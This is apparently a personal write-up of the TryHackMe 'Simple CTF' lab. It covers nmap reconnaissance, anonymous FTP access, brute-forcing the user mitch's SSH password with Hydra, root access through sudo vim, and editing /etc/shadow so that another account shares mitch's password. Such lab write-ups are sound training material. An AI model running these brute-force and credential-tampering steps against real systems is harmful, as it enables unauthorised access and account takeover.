> Thu 31 Jul 2025
> al3xx

![[Write-ups/TryHackMe/Linux/img/s7.png]]

# Simple CTF [Link](https://tryhackme.com/room/easyctf)

## 1. Reconnaissance
#### TCP Scan

```bash
ip=10.10.126.78
sudo nmap -sC -p- -T4 -oN nmap.txt $ip
```  

Based on the `TCP scan results`, the following ports are `available` for **further assessment**:

| Port   | Software | Version                                 | Status |
| ------ | -------- | --------------------------------------- | ------ |
| 21/tcp | ftp      | vsFTPd 3.0.3 - secure, fast, stable     | open   |
| 80/tcp | http     | http-title: Apache2 Ubuntu Default Page | open   |
| 2222   | ssh      | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8         | open   |
Based on the scan results, we can observe that `port 80` is open and running an **Apache HTTP server** and there is a ftp service running at port 21

## 2. Enumeration

### 1. FTP Enumeration

Port: `21`

The FTP service is **vulnerable to anonymous login**, which allows us to access it without credentials.
![Alt text](Write-ups/TryHackMe/Linux/img/s2.png)

After logging in, we navigated to the `/pub` directory and found a file named: `ForMitch.txt`
![Alt](Write-ups/TryHackMe/Linux/img/s3.png)

File found: `ForMitch.txt` 

File content:

```TEXT
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

🔍 Analysis:
- The message refers to a **user named `mitch`**.
- It implies that:
	- The **system username is `mitch`**.
	- The **password is weak** and can be **brute-forced easily**.
	- The **same password** might be used across different services (e.g., SSH).

### 2. Web Enumeration

After logging via SSH 

```bash
$ ls /var/www/html
index.html  robots.txt  simple
```

Upon further inspection, I discovered a subdirectory accessible via the browser:
```browser
http://10.10.219.207/simple
```
This page is running **CMS Made Simple version 2.2.8**.

**Vulnerability Identified:**
- **CVE:** CVE-2019-9053
- **Description:** CMS Made Simple ≤ 2.2.9 is vulnerable to **SQL Injection** via the `mact` parameter in the `moduleinterface` endpoint.
## 3. Exploitation
### Exploitation – Cracking Password with Hydra

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.126.78:2222
[2222][ssh] host: 10.10.126.78   login: mitch   password: secret
```

login: mitch
password: secret
Next step login with *ssh*:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh mitch@10.10.126.78 -p 2222
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
$
```


## 4. Privilege Escalation
To check what commands the user `mitch` can run as `root`, I ran:

```bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Full Root Access via `sunbath`
```bash
su sunbath
```

I checked the user's sudo permissions:

sunbath@Machine:~$ sudo -l
[sudo] password for sunbath:
User sunbath may run the following commands on Machine:
    (ALL : ALL) ALL

```bash
sunbath@Machine:~$ sudo cat /root/root.txt
W3ll d0n3. You made it!
sunbath@Machine:~$
```

## 5. Post-Exploitation

After logging in via SSH as `mitch`
```bash
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$
```

After checking the port 80 is open i check if my user is how is own this apache 
```bash
$ ls /var/www/html
index.html  robots.txt	simple
$
```

After gaining root access using `sudo vim`, I was able to **read and write** the `/etc/shadow` file:
```bash
sudo vim /etc/shadow
```

I decided to move laterally and gain access to another user account: **`sunbath`**.
so next move is give sunbath the same value of mitch

![[Write-ups/TryHackMe/Linux/img/s5.png]]

now mitch and sunbath have the same password and i can navigate between the both easily 

```bash
ssh sunbath@10.10.126.78
```
